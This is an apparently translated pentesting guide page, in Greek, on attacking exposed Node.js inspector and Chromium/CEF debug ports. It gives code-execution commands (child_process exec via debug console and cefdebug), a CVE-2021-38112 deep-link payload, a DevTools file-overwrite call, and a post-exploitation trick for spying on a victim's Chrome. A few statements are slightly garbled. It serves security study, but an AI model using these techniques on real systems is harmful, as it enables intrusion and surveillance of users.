# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Όταν ξεκινά με την επιλογή `--inspect`, μια διαδικασία Node.js ακούει για έναν πελάτη αποσφαλμάτωσης. Από **προεπιλογή**, θα ακούει στη διεύθυνση και την θύρα **`127.0.0.1:9229`**. Κάθε διαδικασία έχει επίσης ανατεθεί μια **μοναδική** **UUID**.

Οι πελάτες αποσφαλμάτωσης πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση του διακομιστή, την θύρα και την UUID για να συνδεθούν. Μια πλήρης διεύθυνση URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Δεδομένου ότι ο **αποσφαλματωτής έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης Node.js**, ένας κακόβουλος παράγοντας που μπορεί να συνδεθεί σε αυτή τη θύρα μπορεί να είναι σε θέση να εκτελέσει αυθαίρετο κώδικα εκ μέρους της διαδικασίας Node.js (**πιθανή κλιμάκωση προνομίων**).

Υπάρχουν αρκετοί τρόποι για να ξεκινήσει ένας αποσφαλματωτής:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν ξεκινάτε μια διαδικασία που επιθεωρείται, κάτι τέτοιο θα εμφανιστεί:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) χρειάζονται να χρησιμοποιήσουν την παράμετρο: `--remote-debugging-port=9222` για να ανοίξουν τον **debugger** (οι προστασίες SSRF παραμένουν πολύ παρόμοιες). Ωστόσο, **αντί** να παραχωρήσουν μια συνεδρία **debug** **NodeJS**, θα επικοινωνήσουν με τον περιηγητή χρησιμοποιώντας το [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), αυτή είναι μια διεπαφή για τον έλεγχο του περιηγητή, αλλά δεν υπάρχει άμεσο RCE.

Όταν ξεκινάτε έναν περιηγητή σε κατάσταση αποσφαλμάτωσης, κάτι τέτοιο θα εμφανιστεί:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets και πολιτική ίδιου προέλευσης <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε έναν web-browser μπορούν να κάνουν WebSocket και HTTP αιτήματα σύμφωνα με το μοντέλο ασφάλειας του browser. Μια **αρχική σύνδεση HTTP** είναι απαραίτητη για να **αποκτηθεί ένα μοναδικό id συνεδρίας debugger**. Η **πολιτική ίδιου προέλευσης** **αποτρέπει** τους ιστότοπους από το να μπορούν να κάνουν **αυτή τη σύνδεση HTTP**. Για επιπλέον ασφάλεια κατά των [**επιθέσεων DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι οι **κεφαλίδες 'Host'** για τη σύνδεση είτε καθορίζουν μια **διεύθυνση IP** είτε **`localhost`** ή **`localhost6`** ακριβώς.

> [!NOTE]
> Αυτά τα **μέτρα ασφαλείας αποτρέπουν την εκμετάλλευση του inspector** για να εκτελούνται κώδικες απλά στέλνοντας ένα HTTP αίτημα (το οποίο θα μπορούσε να γίνει εκμεταλλευόμενοι μια ευπάθεια SSRF).

### Ξεκινώντας τον inspector σε τρέχουσες διαδικασίες

Μπορείτε να στείλετε το **σήμα SIGUSR1** σε μια τρέχουσα διαδικασία nodejs για να **ξεκινήσει τον inspector** στην προεπιλεγμένη θύρα. Ωστόσο, σημειώστε ότι χρειάζεστε αρκετά δικαιώματα, οπότε αυτό μπορεί να σας δώσει **προνομιακή πρόσβαση σε πληροφορίες μέσα στη διαδικασία** αλλά όχι άμεση κλιμάκωση δικαιωμάτων.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Αυτό είναι χρήσιμο σε κοντέινερ γιατί **η διακοπή της διαδικασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν είναι επιλογή** γιατί το **κοντέινερ** θα **τερματιστεί** με τη διαδικασία.

### Σύνδεση με τον επιθεωρητή/αποσφαλματωτή

Για να συνδεθείτε με έναν **πλοηγό βασισμένο σε Chromium**, μπορείτε να αποκτήσετε πρόσβαση στις διευθύνσεις URL `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Ρύθμιση, θα πρέπει να διασφαλιστεί ότι ο **στόχος και η θύρα** είναι σωστά καταχωρημένα. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):

![](<../../images/image (674).png>)

Χρησιμοποιώντας τη **γραμμή εντολών** μπορείτε να συνδεθείτε με έναν αποσφαλματωτή/επιθεωρητή με:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει να **βρείτε επιθεωρητές** που εκτελούνται τοπικά και να **εισάγετε κώδικα** σε αυτούς.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Σημειώστε ότι **οι εκμεταλλεύσεις RCE του NodeJS δεν θα λειτουργήσουν** αν συνδεθείτε σε έναν περιηγητή μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέροντα πράγματα να κάνετε με αυτό).

## RCE στον Debugger/Inspector του NodeJS

> [!NOTE]
> Αν ήρθατε εδώ ψάχνοντας πώς να αποκτήσετε [**RCE από μια XSS σε Electron παρακαλώ ελέγξτε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Ορισμένοι κοινοί τρόποι για να αποκτήσετε **RCE** όταν μπορείτε να **συνδεθείτε** σε έναν **inspector** του Node είναι η χρήση κάποιου όπως (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Σε αυτή την ενότητα θα παραθέσω μόνο ενδιαφέροντα πράγματα που έχω βρει ότι οι άνθρωποι έχουν χρησιμοποιήσει για να εκμεταλλευτούν αυτό το πρωτόκολλο.

### Parameter Injection via Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino security ανακάλυψε ότι μια εφαρμογή βασισμένη σε CEF **καταχώρησε μια προσαρμοσμένη UR**I στο σύστημα (workspaces://) που έλαβε το πλήρες URI και στη συνέχεια **εκκίνησε την εφαρμογή βασισμένη σε CEF** με μια ρύθμιση που κατασκευαζόταν εν μέρει από αυτό το URI.

Ανακαλύφθηκε ότι οι παράμετροι URI αποκωδικοποιούνταν URL και χρησιμοποιούνταν για να εκκινήσουν την βασική εφαρμογή CEF, επιτρέποντας σε έναν χρήστη να **εισάγει** τη σημαία **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετα πράγματα.

Έτσι, ένα payload όπως:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει ένα calc.exe.

### Επικαλύψεις Αρχείων

Αλλάξτε τον φάκελο όπου **θα αποθηκευτούν τα κατεβασμένα αρχεία** και κατεβάστε ένα αρχείο για να **επικαλύψετε** τον συχνά χρησιμοποιούμενο **κώδικα πηγής** της εφαρμογής με τον **κακόβουλο κώδικά** σας.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE και εξαγωγή

Σύμφωνα με αυτή την ανάρτηση: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) είναι δυνατόν να αποκτηθεί RCE και να εξαχθούν εσωτερικές σελίδες από theriver.

### Μετά την εκμετάλλευση

Σε ένα πραγματικό περιβάλλον και **μετά την παραβίαση** ενός υπολογιστή χρήστη που χρησιμοποιεί πρόγραμμα περιήγησης βασισμένο σε Chrome/Chromium, θα μπορούσατε να εκκινήσετε μια διαδικασία Chrome με **την αποσφαλμάτωση ενεργοποιημένη και να προωθήσετε την θύρα αποσφαλμάτωσης** ώστε να μπορείτε να την αποκτήσετε. Με αυτόν τον τρόπο θα είστε σε θέση να **εξετάσετε τα πάντα που κάνει το θύμα με το Chrome και να κλέψετε ευαίσθητες πληροφορίες**.

Ο κρυφός τρόπος είναι να **τερματίσετε κάθε διαδικασία Chrome** και στη συνέχεια να καλέσετε κάτι σαν
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Αναφορές

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
